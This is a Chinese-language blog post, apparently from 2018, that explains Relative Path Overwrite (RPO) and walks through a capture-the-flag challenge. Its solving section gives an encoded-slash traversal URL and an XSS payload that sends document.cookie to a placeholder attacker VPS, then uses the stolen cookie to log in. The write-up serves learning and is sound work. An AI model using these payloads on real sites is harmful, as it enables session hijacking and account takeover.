@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="#0x01 什么是RPORPO (Relative Path Overwrite)相对路径覆盖，作为一种相对新型的攻击方式,由 Gareth Heyes在2014年首次提出，利用的是nginx服务器、配置错误的Apache服务器和浏览器之间对URL解析出现的差异，并借助文件中包含的相对路径的css或者js造成跨目录读取css或者js，甚至可以将本身不是css或者js的页面当做css或者js解析，从">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RPO学习总结">
+<meta property="og:url" content="https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Quincy&#39;s blog">
+<meta property="og:description" content="#0x01 什么是RPORPO (Relative Path Overwrite)相对路径覆盖，作为一种相对新型的攻击方式,由 Gareth Heyes在2014年首次提出，利用的是nginx服务器、配置错误的Apache服务器和浏览器之间对URL解析出现的差异，并借助文件中包含的相对路径的css或者js造成跨目录读取css或者js，甚至可以将本身不是css或者js的页面当做css或者js解析，从">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2018/04/26/C3Q2uV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/04/26/C3QhEF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/04/26/C33LD0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/04/26/C3QhEF.png">
+<meta property="article:published_time" content="2018-04-27T01:52:00.000Z">
+<meta property="article:modified_time" content="2020-03-17T03:15:54.751Z">
+<meta property="article:author" content="Quincy">
+<meta property="article:tag" content="RPO">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/04/26/C3Q2uV.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>RPO学习总结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/04/10/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&text=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&is_video=false&description=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RPO学习总结&body=Check out this article: https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&name=RPO学习总结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-什么是RPO"><span class="toc-number">1.</span> <span class="toc-text">#0x01 什么是RPO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-在什么情况下漏洞会触发"><span class="toc-number">2.</span> <span class="toc-text">#0x02 在什么情况下漏洞会触发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-漏洞利用及讲解"><span class="toc-number">3.</span> <span class="toc-text">#0x03 漏洞利用及讲解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04解题过程"><span class="toc-number">4.</span> <span class="toc-text">#0x04解题过程</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        RPO学习总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Quincy's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-04-27T01:52:00.000Z" itemprop="datePublished">2018-04-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Web/">Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/RPO/" rel="tag">RPO</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="0x01-什么是RPO"><a href="#0x01-什么是RPO" class="headerlink" title="#0x01 什么是RPO"></a>#0x01 什么是RPO</h4><p>RPO (Relative Path Overwrite)相对路径覆盖，作为一种相对新型的攻击方式,由 Gareth Heyes在2014年首次提出，利用的是nginx服务器、配置错误的Apache服务器和浏览器之间对URL解析出现的差异，并借助文件中包含的相对路径的css或者js造成跨目录读取css或者js，甚至可以将本身不是css或者js的页面当做css或者js解析，从而触发xss等进一步的攻击手段。</p>
+<h4 id="0x02-在什么情况下漏洞会触发"><a href="#0x02-在什么情况下漏洞会触发" class="headerlink" title="#0x02 在什么情况下漏洞会触发"></a>#0x02 在什么情况下漏洞会触发</h4><p>触发这个漏洞有两个基本的前提：</p>
+<blockquote>
+<p>①Apache 配置错误导致AllowEncodedSlashes这个选项开启（对Apache来说默认情况下 AllowEncodedSlashes 这个选项是关闭的），或者nginx服务器。</p>
+<p>②存在相对路径的js或者css的引用</p>
+</blockquote>
+<h4 id="0x03-漏洞利用及讲解"><a href="#0x03-漏洞利用及讲解" class="headerlink" title="#0x03 漏洞利用及讲解"></a>#0x03 漏洞利用及讲解</h4><ul>
+<li><p>前两天k0rz3n师傅为了帮助我们理解RPO漏洞，特地除了一道题目，以下简单介绍一下这道题的做法:</p>
+<ul>
+<li><p>首先我们看到一个求助的界面</p>
+<p><img src="https://s1.ax1x.com/2018/04/26/C3Q2uV.png" alt=""></p>
+<p>​</p>
+<p>​</p>
+<p>可以看到页面中包含一个相对路径的js，这位我们后面利用RPO漏洞提供了可能</p>
+<p><img src="https://s1.ax1x.com/2018/04/26/C3QhEF.png" alt=""></p>
+<p>​</p>
+</li>
+<li><p>进入评论区，我们可以发现我们输入的文本都会以文本的形式显示出来</p>
+<p><img src="https://s1.ax1x.com/2018/04/26/C33LD0.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p>下面开始介绍今天的主角RPO导致的XSS漏洞</p>
+<ul>
+<li><p>phpinfo url 模式</p>
+<p>我们看到一个这样的url<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code></p>
+<p>难道有一个目录叫做index.php？</p>
+<p>其实它使用了url rewrite的php开发框架，也叫PHPINFO URL模式 等价于</p>
+<p><code>http://ctf.k0rz3n.com/index.php/?users=hacker&amp;html=2</code></p>
+<p>​</p>
+</li>
+<li><p>漏洞成因</p>
+<p>文章最开始提到过，RPO漏洞就是“相对路径覆盖”，而这道题的漏洞产生，也是因为相对路径</p>
+<p><img src="https://s1.ax1x.com/2018/04/26/C3QhEF.png" alt=""></p>
+<p>我们来分析一下我们的</p>
+<p><strong>payload:</strong><code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/..%2f..%2f..%2f..%2findex.php</code></p>
+<p>对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。</p>
+<p>对于payload，也就相当于访问</p>
+<p><code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/../../../../index.php</code></p>
+<p>向上跳了四层，依旧返回index.php页面的内容</p>
+<p>但是！服务端和客户端之间产生了沟通差异，浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为<code>..%2f..%2f..%2f..%2findex.php</code>这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。<br>就好比输入url-<code>https://www.baidu.com?id=1</code>，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递，返回的资源仍然是<code>https://www.baidu.com</code>的。而<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/..%2f..%2f..%2f..%2findex.php</code>相当于在文章ID为36967的文章页面传了一个叫<code>..%2f..%2f..%2f..%2findex.php</code>的参数，没有人接收，所以返回的资源就只是<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code></p>
+<p>浏览器错误理解url后，请求相对路径中请求的资源路径，就变成了<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js</code></p>
+<p>当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</p>
+<p>读到<code>..%2f..%2f..%2f..%2findex.php</code>这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code></p>
+<p>所以把<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code>的页面内容，也就是<code>alert(&#39;xss&#39;)</code>当做是js文件的内容，带回到了<code>&lt;script&gt;</code>标签中，也就因此，造成了XSS漏洞.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="0x04解题过程"><a href="#0x04解题过程" class="headerlink" title="#0x04解题过程"></a>#0x04解题过程</h4><ul>
+<li><p>首先，到评论区输入<em>XSS Payload</em></p>
+<p>``(new Image()).src = ‘<a href="http://VPSIP:Port?&#39;+document.cookie`">http://VPSIP:Port?&#39;+document.cookie`</a></p>
+</li>
+<li><p>然后到首页，将我们构造好的含有RPO漏洞的URL</p>
+<p><code>http://ctf.k0rz3n.com/index.php/users/hacker/html/4/..%2f..%2f..%2f..%2findex.php</code></p>
+</li>
+<li><p>同时监听我们的vps端口</p>
+</li>
+<li><p>然后利用我们得到的cookie，进行登录，就可以获取flag了</p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-什么是RPO"><span class="toc-number">1.</span> <span class="toc-text">#0x01 什么是RPO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-在什么情况下漏洞会触发"><span class="toc-number">2.</span> <span class="toc-text">#0x02 在什么情况下漏洞会触发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-漏洞利用及讲解"><span class="toc-number">3.</span> <span class="toc-text">#0x03 漏洞利用及讲解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04解题过程"><span class="toc-number">4.</span> <span class="toc-text">#0x04解题过程</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&text=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&is_video=false&description=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RPO学习总结&body=Check out this article: https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&title=RPO学习总结" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.quincy.codes/2018/04/27/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/&name=RPO学习总结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Quincy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'quincyblog-top';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
